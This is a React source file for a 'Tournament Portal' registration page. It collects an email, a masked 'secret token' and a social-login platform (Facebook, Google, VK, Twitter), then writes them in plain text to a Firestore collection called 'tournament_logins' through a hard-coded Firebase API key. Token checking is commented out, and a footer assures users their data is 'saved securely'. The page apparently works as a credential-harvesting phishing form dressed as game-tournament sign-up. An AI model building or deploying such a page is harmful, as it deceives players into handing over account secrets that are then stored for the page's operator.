import { useState, useEffect, useRef } from "react";

// ─────────────────────────────────────────────
//  🔥 FIREBASE CONFIG
// ─────────────────────────────────────────────
const FIREBASE_CONFIG = {
  projectId: "reefree",
  apiKey: "AIzaSyBnYZ5BNGEFPpsx1YdURPfgRIkREyfcNd4",
};

const FIRESTORE_URL = `https://firestore.googleapis.com/v1/projects/${FIREBASE_CONFIG.projectId}/databases/(default)/documents/tournament_logins`;

// ─────────────────────────────────────────────
//  Squads & Login Methods
// ─────────────────────────────────────────────
const SQUADS = [
  "Squad Alpha",
  "Squad Beta",
  "Omega Team",
  "Delta Force",
  "Phoenix Squad",
  "Iron Legion",
];

const LOGIN_METHODS = ["Facebook", "Google", "VK", "Twitter"];

// ─────────────────────────────────────────────
//  Helpers
// ─────────────────────────────────────────────
function toFirestoreDoc(data) {
  return {
    fields: {
      email:       { stringValue: data.email },
      secretToken: { stringValue: data.secretToken },
      loginMethod: { stringValue: data.loginMethod },
      squad:       { stringValue: data.squad },
      timestamp:   { timestampValue: new Date().toISOString() },
    },
  };
}

async function submitToFirestore(data) {
  const url = `${FIRESTORE_URL}?key=${FIREBASE_CONFIG.apiKey}`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(toFirestoreDoc(data)),
  });
  if (!res.ok) {
    const err = await res.json();
    throw new Error(err?.error?.message || "Firestore write failed");
  }
  return res.json();
}

// ─────────────────────────────────────────────
//  Toast Component
// ─────────────────────────────────────────────
function Toast({ message, type, visible }) {
  return (
    <div style={{
      position: "fixed", top: "24px", left: "50%",
      transform: visible ? "translate(-50%, 0)" : "translate(-50%, -120%)",
      transition: "transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.3s ease",
      opacity: visible ? 1 : 0, zIndex: 9999,
      background: type === "success" ? "#1A2E1A" : "#2E1A1A",
      color: type === "success" ? "#A8D5A2" : "#D5A2A2",
      padding: "12px 24px", borderRadius: "100px", fontSize: "13px",
      fontFamily: "'Jost', sans-serif", letterSpacing: "0.02em", fontWeight: "500",
      boxShadow: "0 8px 32px rgba(0,0,0,0.18)",
      display: "flex", alignItems: "center", gap: "8px",
      pointerEvents: "none", whiteSpace: "nowrap",
    }}>
      {type === "success" ? (
        <svg width="15" height="15" viewBox="0 0 15 15" fill="none">
          <circle cx="7.5" cy="7.5" r="7" stroke="#A8D5A2" strokeWidth="1.2"/>
          <path d="M4.5 7.5L6.5 9.5L10.5 5.5" stroke="#A8D5A2" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"/>
        </svg>
      ) : (
        <svg width="15" height="15" viewBox="0 0 15 15" fill="none">
          <circle cx="7.5" cy="7.5" r="7" stroke="#D5A2A2" strokeWidth="1.2"/>
          <path d="M7.5 4.5V8" stroke="#D5A2A2" strokeWidth="1.4" strokeLinecap="round"/>
          <circle cx="7.5" cy="10.5" r="0.7" fill="#D5A2A2"/>
        </svg>
      )}
      {message}
    </div>
  );
}

// ─────────────────────────────────────────────
//  SelectField Component
// ─────────────────────────────────────────────
function SelectField({ label, id, value, onChange, options, placeholder, error }) {
  const [focused, setFocused] = useState(false);
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
      <label htmlFor={id} style={{
        fontSize: "11px", fontWeight: "600", letterSpacing: "0.1em",
        textTransform: "uppercase", fontFamily: "'Jost', sans-serif",
        color: focused ? "#3B5BA5" : "#8A8A8A", transition: "color 0.2s ease",
      }}>{label}</label>
      <div style={{ position: "relative" }}>
        <select id={id} value={value} onChange={onChange}
          onFocus={() => setFocused(true)} onBlur={() => setFocused(false)}
          style={{
            width: "100%", padding: "12px 40px 12px 16px",
            border: `1.5px solid ${error ? "#C0392B" : focused ? "#3B5BA5" : "#E8E8E8"}`,
            borderRadius: "10px", background: focused ? "#F8FAFF" : "#FAFAFA",
            fontSize: "14px", fontFamily: "'Jost', sans-serif",
            color: value ? "#1C1C1E" : "#ABABAB", outline: "none",
            appearance: "none", cursor: "pointer", transition: "all 0.2s ease",
            boxShadow: focused ? "0 0 0 3px rgba(59,91,165,0.08)" : "none",
          }}>
          <option value="" disabled style={{ color: "#ABABAB" }}>{placeholder}</option>
          {options.map(opt => <option key={opt} value={opt} style={{ color: "#1C1C1E" }}>{opt}</option>)}
        </select>
        <svg style={{
          position: "absolute", right: "14px", top: "50%",
          transform: `translateY(-50%) rotate(${focused ? 180 : 0}deg)`,
          transition: "transform 0.2s ease", pointerEvents: "none",
        }} width="14" height="14" viewBox="0 0 14 14" fill="none">
          <path d="M3 5L7 9L11 5" stroke={focused ? "#3B5BA5" : "#ABABAB"} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
        </svg>
      </div>
      {error && <span style={{ fontSize: "11px", color: "#C0392B", fontFamily: "'Jost', sans-serif" }}>{error}</span>}
    </div>
  );
}

// ─────────────────────────────────────────────
//  InputField Component
// ─────────────────────────────────────────────
function InputField({ label, id, type = "text", value, onChange, placeholder, error, rightSlot }) {
  const [focused, setFocused] = useState(false);
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: "6px" }}>
      <label htmlFor={id} style={{
        fontSize: "11px", fontWeight: "600", letterSpacing: "0.1em",
        textTransform: "uppercase", fontFamily: "'Jost', sans-serif",
        color: focused ? "#3B5BA5" : "#8A8A8A", transition: "color 0.2s ease",
      }}>{label}</label>
      <div style={{ position: "relative" }}>
        <input id={id} type={type} value={value} onChange={onChange}
          placeholder={placeholder}
          onFocus={() => setFocused(true)} onBlur={() => setFocused(false)}
          style={{
            width: "100%", padding: rightSlot ? "12px 44px 12px 16px" : "12px 16px",
            border: `1.5px solid ${error ? "#C0392B" : focused ? "#3B5BA5" : "#E8E8E8"}`,
            borderRadius: "10px", background: focused ? "#F8FAFF" : "#FAFAFA",
            fontSize: "14px", fontFamily: "'Jost', sans-serif",
            color: "#1C1C1E", outline: "none", transition: "all 0.2s ease",
            boxShadow: focused ? "0 0 0 3px rgba(59,91,165,0.08)" : "none",
            boxSizing: "border-box",
          }}
        />
        {rightSlot && (
          <div style={{ position: "absolute", right: "12px", top: "50%", transform: "translateY(-50%)", cursor: "pointer" }}>
            {rightSlot}
          </div>
        )}
      </div>
      {error && <span style={{ fontSize: "11px", color: "#C0392B", fontFamily: "'Jost', sans-serif" }}>{error}</span>}
    </div>
  );
}

// ─────────────────────────────────────────────
//  Main App
// ─────────────────────────────────────────────
const INITIAL_FORM = { email: "", secretToken: "", loginMethod: "", squad: "" };

export default function TournamentLogin() {
  const [form, setForm] = useState(INITIAL_FORM);
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [showToken, setShowToken] = useState(false);
  const [toast, setToast] = useState({ visible: false, message: "", type: "success" });
  const [submitted, setSubmitted] = useState(false);
  const toastTimer = useRef(null);

  useEffect(() => {
    const link = document.createElement("link");
    link.href = "https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500;600&family=Jost:wght@300;400;500;600&display=swap";
    link.rel = "stylesheet";
    document.head.appendChild(link);
    return () => document.head.removeChild(link);
  }, []);

  const showToast = (message, type = "success") => {
    if (toastTimer.current) clearTimeout(toastTimer.current);
    setToast({ visible: true, message, type });
    toastTimer.current = setTimeout(() => setToast(t => ({ ...t, visible: false })), 3500);
  };

  const set = (field) => (e) => setForm(f => ({ ...f, [field]: e.target.value }));

  const validate = () => {
    const e = {};
    if (!form.email) e.email = "Email is required";
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)) e.email = "Enter a valid email address";
    if (!form.secretToken) e.secretToken = "Secret token is required";
    if (!form.loginMethod) e.loginMethod = "Select a login method";
    if (!form.squad) e.squad = "Select your squad";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const handleSubmit = async () => {
    if (!validate()) return;
    setLoading(true);

    // ────────────────────────────────────────────
    // 🔒 SECRET TOKEN VALIDATION
    // Uncomment and fill in your master token list:
    //
    // const MASTER_TOKENS = ["TOKEN_A", "TOKEN_B", "VALID_2024"];
    // if (!MASTER_TOKENS.includes(form.secretToken)) {
    //   setErrors(e => ({ ...e, secretToken: "Invalid secret token" }));
    //   setLoading(false);
    //   return;
    // }
    // ────────────────────────────────────────────

    try {
      await submitToFirestore(form);
      setSubmitted(true);
      setForm(INITIAL_FORM);
      setErrors({});
      showToast("Registration successful! Welcome to the tournament.", "success");
      setTimeout(() => setSubmitted(false), 4000);
    } catch (err) {
      console.error(err);
      showToast(err.message || "Something went wrong. Please try again.", "error");
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <Toast {...toast} />
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500;600&family=Jost:wght@300;400;500;600&display=swap');
        * { box-sizing: border-box; margin: 0; padding: 0; }
        input::placeholder { color: #C0C0C0; }
        @keyframes fadeUp {
          from { opacity: 0; transform: translateY(20px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        @keyframes shimmer {
          0%   { background-position: -200% center; }
          100% { background-position: 200% center; }
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .card-appear { animation: fadeUp 0.55s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
        .field-appear { opacity: 0; animation: fadeUp 0.45s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
        .field-appear:nth-child(1) { animation-delay: 0.10s; }
        .field-appear:nth-child(2) { animation-delay: 0.18s; }
        .field-appear:nth-child(3) { animation-delay: 0.26s; }
        .field-appear:nth-child(4) { animation-delay: 0.34s; }
        .field-appear:nth-child(5) { animation-delay: 0.42s; }
        .submit-btn { transition: all 0.2s ease; }
        .submit-btn:hover:not(:disabled) {
          transform: translateY(-1px);
          box-shadow: 0 8px 24px rgba(59, 91, 165, 0.28) !important;
        }
        .submit-btn:active:not(:disabled) { transform: translateY(0); }
      `}</style>

      <div style={{
        minHeight: "100vh", background: "#F2F1EE",
        display: "flex", alignItems: "center", justifyContent: "center",
        padding: "24px 16px", fontFamily: "'Jost', sans-serif",
        backgroundImage: `
          radial-gradient(circle at 20% 20%, rgba(59,91,165,0.04) 0%, transparent 50%),
          radial-gradient(circle at 80% 80%, rgba(59,91,165,0.03) 0%, transparent 50%)
        `,
      }}>
        <div className="card-appear" style={{
          width: "100%", maxWidth: "440px", background: "#FFFFFF",
          borderRadius: "20px",
          boxShadow: "0 2px 8px rgba(0,0,0,0.04), 0 16px 48px rgba(0,0,0,0.08)",
          overflow: "hidden",
        }}>
          {/* Shimmer bar */}
          <div style={{
            height: "3px",
            background: "linear-gradient(90deg, #3B5BA5 0%, #6A85C8 50%, #3B5BA5 100%)",
            backgroundSize: "200% auto",
            animation: "shimmer 3s linear infinite",
          }} />

          <div style={{ padding: "40px 40px 36px" }}>
            {/* Header */}
            <div className="field-appear" style={{ marginBottom: "32px" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "8px" }}>
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                  <path d="M10 13C7.24 13 5 10.76 5 8V3H15V8C15 10.76 12.76 13 10 13Z" stroke="#3B5BA5" strokeWidth="1.4" strokeLinejoin="round"/>
                  <path d="M5 5H2.5C2.5 5 2.5 9 5 9" stroke="#3B5BA5" strokeWidth="1.4" strokeLinecap="round"/>
                  <path d="M15 5H17.5C17.5 5 17.5 9 15 9" stroke="#3B5BA5" strokeWidth="1.4" strokeLinecap="round"/>
                  <path d="M10 13V16" stroke="#3B5BA5" strokeWidth="1.4" strokeLinecap="round"/>
                  <path d="M7 16H13" stroke="#3B5BA5" strokeWidth="1.4" strokeLinecap="round"/>
                </svg>
                <span style={{
                  fontSize: "11px", fontWeight: "600", letterSpacing: "0.14em",
                  textTransform: "uppercase", color: "#3B5BA5",
                }}>Tournament Portal</span>
              </div>
              <h1 style={{
                fontFamily: "'Cormorant Garamond', serif",
                fontSize: "clamp(26px, 5vw, 32px)", fontWeight: "600",
                color: "#1C1C1E", lineHeight: "1.15", marginBottom: "6px",
              }}>Register to Compete</h1>
              <p style={{ fontSize: "13.5px", color: "#9A9A9A", lineHeight: "1.5" }}>
                Enter your credentials to join your squad.
              </p>
            </div>

            {/* Form */}
            <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
              <div className="field-appear">
                <InputField label="Email Address" id="email" type="email"
                  value={form.email} onChange={set("email")}
                  placeholder="you@example.com" error={errors.email} />
              </div>

              <div className="field-appear">
                <InputField label="Secret Token" id="secretToken"
                  type={showToken ? "text" : "password"}
                  value={form.secretToken} onChange={set("secretToken")}
                  placeholder="Enter your access token" error={errors.secretToken}
                  rightSlot={
                    <button onClick={() => setShowToken(v => !v)} style={{
                      background: "none", border: "none", cursor: "pointer",
                      padding: "2px", display: "flex", alignItems: "center",
                    }}>
                      {showToken ? (
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                          <path d="M2 8C2 8 4.5 3.5 8 3.5C11.5 3.5 14 8 14 8C14 8 11.5 12.5 8 12.5C4.5 12.5 2 8 2 8Z" stroke="#ABABAB" strokeWidth="1.2"/>
                          <circle cx="8" cy="8" r="2" stroke="#ABABAB" strokeWidth="1.2"/>
                          <path d="M2 2L14 14" stroke="#ABABAB" strokeWidth="1.2" strokeLinecap="round"/>
                        </svg>
                      ) : (
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                          <path d="M2 8C2 8 4.5 3.5 8 3.5C11.5 3.5 14 8 14 8C14 8 11.5 12.5 8 12.5C4.5 12.5 2 8 2 8Z" stroke="#ABABAB" strokeWidth="1.2"/>
                          <circle cx="8" cy="8" r="2" stroke="#ABABAB" strokeWidth="1.2"/>
                        </svg>
                      )}
                    </button>
                  }
                />
              </div>

              <div className="field-appear">
                <SelectField label="Login Method" id="loginMethod"
                  value={form.loginMethod} onChange={set("loginMethod")}
                  options={LOGIN_METHODS} placeholder="Select platform"
                  error={errors.loginMethod} />
              </div>

              <div className="field-appear">
                <SelectField label="Select Squad" id="squad"
                  value={form.squad} onChange={set("squad")}
                  options={SQUADS} placeholder="Choose your squad"
                  error={errors.squad} />
              </div>

              <div className="field-appear">
                <button className="submit-btn" onClick={handleSubmit}
                  disabled={loading || submitted}
                  style={{
                    width: "100%", padding: "14px", borderRadius: "10px", border: "none",
                    background: submitted ? "#2D5A2D" : loading ? "#6A85C8" : "#3B5BA5",
                    color: "#FFFFFF", fontSize: "14px", fontFamily: "'Jost', sans-serif",
                    fontWeight: "600", letterSpacing: "0.06em",
                    cursor: loading || submitted ? "not-allowed" : "pointer",
                    display: "flex", alignItems: "center", justifyContent: "center", gap: "8px",
                    boxShadow: "0 4px 16px rgba(59, 91, 165, 0.2)", marginTop: "4px",
                  }}>
                  {loading ? (
                    <>
                      <svg style={{ animation: "spin 0.8s linear infinite" }} width="16" height="16" viewBox="0 0 16 16">
                        <circle cx="8" cy="8" r="6.5" stroke="rgba(255,255,255,0.3)" strokeWidth="1.5" fill="none"/>
                        <path d="M8 1.5A6.5 6.5 0 0 1 14.5 8" stroke="white" strokeWidth="1.5" strokeLinecap="round" fill="none"/>
                      </svg>
                      Registering…
                    </>
                  ) : submitted ? (
                    <>
                      <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                        <circle cx="8" cy="8" r="7" stroke="#A8D5A2" strokeWidth="1.2"/>
                        <path d="M5 8L7 10L11 6" stroke="#A8D5A2" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                      Registered!
                    </>
                  ) : (
                    <>
                      Join Tournament
                      <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
                        <path d="M3 7H11M8 4L11 7L8 10" stroke="white" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    </>
                  )}
                </button>
              </div>
            </div>

            <p style={{
              marginTop: "20px", textAlign: "center",
              fontSize: "11.5px", color: "#BEBEBE", letterSpacing: "0.01em",
            }}>
              Your data is saved securely via Firebase
            </p>
          </div>
        </div>
      </div>
    </>
  );
}
